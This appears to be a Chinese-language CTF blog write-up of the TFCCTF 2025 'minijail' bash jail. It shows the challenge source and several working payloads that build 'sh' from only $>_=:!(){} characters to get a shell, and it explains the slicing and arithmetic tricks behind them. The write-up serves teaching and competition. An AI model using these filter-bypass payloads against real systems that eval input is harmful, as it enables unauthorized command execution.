---
title: TFCCTF 2025 minijail - Bash 下有限字符的极限构造
date: 2025-09-01 14:34:21
categories:
- Bash
tags:
- bash jail
mermaid: true
image:
  path: /assets/images/TFCCTF-2025.png
toc: true
---

TFC CTF 中碰到了一道 bashjail，限制只能使用 `$>_=:!(){}` 这几个字符

## 赛题分析
赛题源码如下：
yo_mama
```bash
#!/bin/bash

goog='^[$>_=:!(){}]+$'

while true; do
    echo -n "caca$ "
    stty -echo
    read -r mine
    stty echo
    echo

    if [[ $mine =~ $goog ]]; then
        eval "$mine"
    else
        echo '[!] Error: forbidden characters detected'
        printf '\n'
    fi
done
```
Dockerfile 
```bash
FROM ubuntu:20.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update \
 && apt-get install -y --no-install-recommends bash socat \
 && rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY yo_mama .
COPY flag.txt /tmp/flag.txt
RUN random_file=$(mktemp /flag.XXXXXX) && mv /tmp/flag.txt "$random_file"

RUN chmod +x yo_mama

ENTRYPOINT ["socat", "TCP-LISTEN:4444,reuseaddr,fork", "EXEC:./yo_mama yooooooo_mama_test,pty,stderr"]
```

我们可以先简单分析该赛题:
1. 仅允许使用这几个字符：`$>_=:!(){}`
   1. 允许使用 $，那么 bash 中的一些预定义变量是可以使用的。
   2. 允许 >，那么可以写文件
   3. 允许 =，可以赋值
   4. 允许 : 可以进行字符串截取比如 `${a:1:1}`
   5. 允许 _，可以充当变量名，比如 `$_,$__` 这种
   6. 允许 !, 感叹号的用法比较多。
   7. 允许 ()、{}
2. flag 包含随机后缀，所以意味着需要 RCE，而不是文件读取（没有通配符）
3. 脚本启动时传入参数 yooooooo_mama_test，但是脚本内部完全没有用到，这是比较奇怪的。

## 解题思路
相关构造用到的基础知识可见 [补充知识点部分](#补充知识点)

1. 我们可以使用 `$(())` 构造出 0，是否就可以使用 `$0` 打开 bash？`$0` 表示的是当前的脚本名字，`$0` 此处为 yo_mama，再次打开也是 yo_mama
2. 其实如果能构造出 sh 就可以了。
   1. 构造字符串 s 
      2. 可以从 yooooooo_mama_test 中截取。`${yooooooo_mama_test:16:1}` 
      3. yooooooo_mama_test 可以通过 `$1` 获取
      4. 1 可以通过 `__=$(()); $((!__))` 获取
      5. 然后通过不断截取来获取最终结果。
        ```bash
        a=${yooooooo_mama_test:1:1}` 
        a=${a:1:1}` 
        ```

   2. 构造字符串 h
      1. 注意到 eval 前的一条命令为 echo，`$_` 就可以获取到上一条指令，那么就可以获取这个 echo。
      2. 配合上面字符串截取即可获取 h

## POC 分析

### poc from us
其实当时解题的时候，我们想要截取 yooooooo_mama_test 中的 s，需要获取 16 这个数字，1 已经有了，差一个 6，从 echo 中截取 h 需要数字 2。

获取这两个数字其实也可以从进程号中获取，虽然不够优雅，但也有一定参考价值。

`$$` 可以获取当前的进程 id，如果我们多次连接靶机则会使得进程号增加。比如：
```bash
./yo_mama: line 13: 43: command not found
caca$ ^C
dumkiy@ubuntu:/project/ctf-archives/TFCCTF/2025/MINIJAIL$ nc localhost 4444
caca$ $$

./yo_mama: line 13: 49: command not found
caca$ ^C
dumkiy@ubuntu:/project/ctf-archives/TFCCTF/2025/MINIJAIL$ nc localhost 4444
caca$ $$

./yo_mama: line 13: 55: command not found
caca$ ^C
dumkiy@ubuntu:/project/ctf-archives/TFCCTF/2025/MINIJAIL$ nc localhost 4444
caca$ $$

./yo_mama: line 13: 61: command not found
caca$
```
这样就可以从 $$ 中获取数字.

我们通过多次重启靶机，使得某次连接时，进程 id 号的前两位恰好为 26（方便用 0 和 1 截取），然后就可以获取对应数字了。相对来讲繁琐一些，但其他部分的利用是一致的。 

### poc from @Swizzer

```bash
___=${_}
__=$((!_))
____=${!__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
___=${___:$__}
___=${___:$__}
${____:$((!__)):$__}${___:$((!__)):$__}
```
该 poc 是最方便的。

### poc from @zhuyifei1999
fisrt blood, orz! 通过右移来获取 6 和 2 两个数字。
```bash
__=$(($$==$$))
${!__:$(($$==$$))$(($(($(($(($(($$==$$))$(($$==$$))$(($$==$$))>>$(($$==$$))))>>$(($$==$$))))>>$(($$==$$))))>>$(($$==$$)))):$(($$==$$))}${_:$(($(($(($$==$$))$(($$!=$$))>>$(($$==$$))))>>$(($$==$$)))):$(($$==$$))}
```
这段 payload 需要拆解一下。
```bash
__=$(($$==$$)) # 1
${
!__
:
$(($$==$$)) # 与 1 拼接 得到 16
$(( # 13 >> 1 = 6
    $(( # 27 >> 1 = 13
        $(( # 55 >> 1 = 27
            $(( # 111 >> 1 = 55
                $(($$==$$))
                $(($$==$$))
                $(($$==$$))>>
                $(($$==$$))
            ))>>$(($$==$$))
        ))>>$(($$==$$))
    ))>>$(($$==$$))
))
:
$(($$==$$))
} # s

${
_
:
$((
    $((
        $(($$==$$))
        $(($$!=$$))>>
        $(($$==$$))
    ))>>$(($$==$$))
))
:
$(($$==$$))
} # h
```

## 补充知识点
### Bash 预定义变量利用
```bash
$0	脚本本身的名字
$1	脚本后所输入的第一串字符
$2	传递给该shell脚本的第二个参数
$*	脚本后所输入的所有字符 'westos' 'linux' 'lyq'
$@	脚本后所输入的所有字符 'westos' 'linux' 'lyq'
$_	表示上一个命令的最后一个参数
$#	#脚本后所输入的字符串个数
$$	脚本运行的当前进程ID号
$!	表示最后执行的后台命令的PID
$?	显示最后命令的退出状态，0表示没有错误，其他表示由错误
_   表示上一个命令的最后一个参数或上一个执行的命令的最后一个参数
```

### 极限的数字获取
```bash
# 获取 0
$(())

# 获取 1
__=$(())
$((!__)) # 1

# 获取 1
# $(( expression )) 会对表达式进行算术求值并返回结果
# _ 表示上一个命令的最后一个参数或上一个执行的命令的最后一个参数，如果上一个命令没有参数，则 !_ 为 0，下面的结果为 1，如果有参数，则 !_ 为 1，则下面结果为 0
$((!_))
```
### 字符串截取
```bash
a=26
${a:1:1} # 6
```
### 将字符串 1 转化为 $1
```bash
a=1
${!a}
```
比如说这道题中启动 yo_mama 传入了参数 yooooooo_mama_test，那么 `${!a}` 就可以得到 yooooooo_mama_test
```bash
caca$ `${!a}
./yo_mama: line 13: yooooooo_mama_test: command not found
```

## 参考
bashfunk 项目中的手法可以借鉴：
- [【bashfuck】bashshell无字母命令执行原理 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/system/361101.html)
